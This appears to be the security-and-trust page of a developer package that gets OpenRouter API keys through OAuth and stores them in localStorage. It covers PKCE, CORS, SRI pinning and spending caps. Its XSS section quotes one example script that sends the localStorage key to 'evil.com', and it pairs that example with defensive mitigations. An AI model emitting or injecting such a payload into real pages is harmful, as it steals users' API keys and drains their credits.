# Security & trust

The whole value of this package is a verifiable promise: **the key goes to the
AI provider and nowhere else, ever.** This page is the full, honest version of
that promise — and its limits.

## What's solid

- **The user's password never touches your site.** OAuth happens on
  `openrouter.ai`; you receive a scoped API key, not credentials.
- **Zero runtime dependencies.** Nine source files, nothing pulled in transitively.
  The only way a third party gets code into your page is if *you* put it there.
- **One default wire.** The key is sent only to `provider.chatURL`
  (default `https://api.openrouter.ai/…`). There is no analytics, no telemetry,
  no "phone home." Verify it:
  ```bash
  grep -rn "fetch(" src/        # every outbound call
  ```
- **PKCE is correct.** The S256 implementation is unit-tested against the
  RFC 7636 reference vector.
- **CORS-verified.** `openrouter.ai` returns `Access-Control-Allow-Origin: *`
  on the auth, key-exchange, and chat endpoints — so the browser calls it
  directly. No proxy is ever needed; the "no backend" story is real at the metal.
- **Revocable, capped keys.** The user sets a credit limit and can revoke the
  key anytime in their OpenRouter dashboard.

## The one real threat: XSS

**The key lives in `localStorage`, so any JavaScript on your page can read it.**
If your site runs a third-party script, an ad, a vulnerable dependency, or — the
classic — renders model output as `innerHTML` and the model emits
`<script>fetch('evil.com?k='+localStorage…)`, the attacker steals the key and
drains credits.

This is not a bug in the package; it is the **fundamental cost of client-side
keys.** There is no fix that preserves the "no backend" promise. Mitigations
(non-negotiable if you ship this):

1. **Strict CSP** — no `unsafe-inline`, no untrusted `connect-src` origins.
2. **Never `innerHTML` AI output.** Always `textContent`. Model output is
   untrusted text, not HTML.
3. **No third-party scripts** on the key-bearing page.
4. **Tell users to set a low credit cap** on their key.

If you cannot guarantee those four, this is the wrong architecture — use a
backend relay instead (you become the trusted party; the key never reaches the
browser).

## The deployment-vs-source gap

Source is auditable; **deployment isn't proven to match source** unless you pin
it. Use SRI (`npm run sri`) so the browser refuses a tampered CDN copy. Without
it, a malicious site could ship a modified version that exfiltrates the key. See
[Providers → SRI](providers.md#pinned-verifiable-install-sri).

## The spending cap is a guard rail, not a hard limit

`ai.setBudget(1)` stops *this app* from calling once the user has spent `$1`,
tracked from OpenRouter's real `usage.cost`. But it is **client-side and
per-browser**: a key reused in another app, another tab, or a page refreshed
mid-call can still exceed it. The only **true** hard ceiling is the **credit
limit the user sets on their key** in the OpenRouter dashboard. Set both — the
dashboard limit is the wall, our cap is the early-stop.

## The key is long-lived

OpenRouter's OAuth returns a **persistent** `sk-or-…` API key, not a short-lived
token with refresh. If stolen, it's valid until the user revokes. That makes the
credit cap and SRI pinning more important, not less.

## What this project will *not* do

It will **not** support "log in with a consumer Claude/ChatGPT account to use
that subscription's quota." Anthropic bans proxying consumer (Free/Pro/Max)
credentials through third-party apps — enforced at their network edge since Jan
2026 — and OpenAI's consumer login is identity-only. Both routes get users'
tokens revoked and break provider terms, regardless of user consent. This is not
prudishness: it is the thing **physically not working** plus being against the
rules.

Legit ways to get Claude/GPT in your app:
- **Via OpenRouter** — pick an `anthropic/claude-*` or `openai/*` model. Works today.
- **BYO API key** — `configure()` to OpenAI/Anthropic/etc. with the user's own
  platform API key. ToS-clean.

## Audience

A tool for **developers**, not end consumers. Normies don't know what an API key
is. Position accordingly.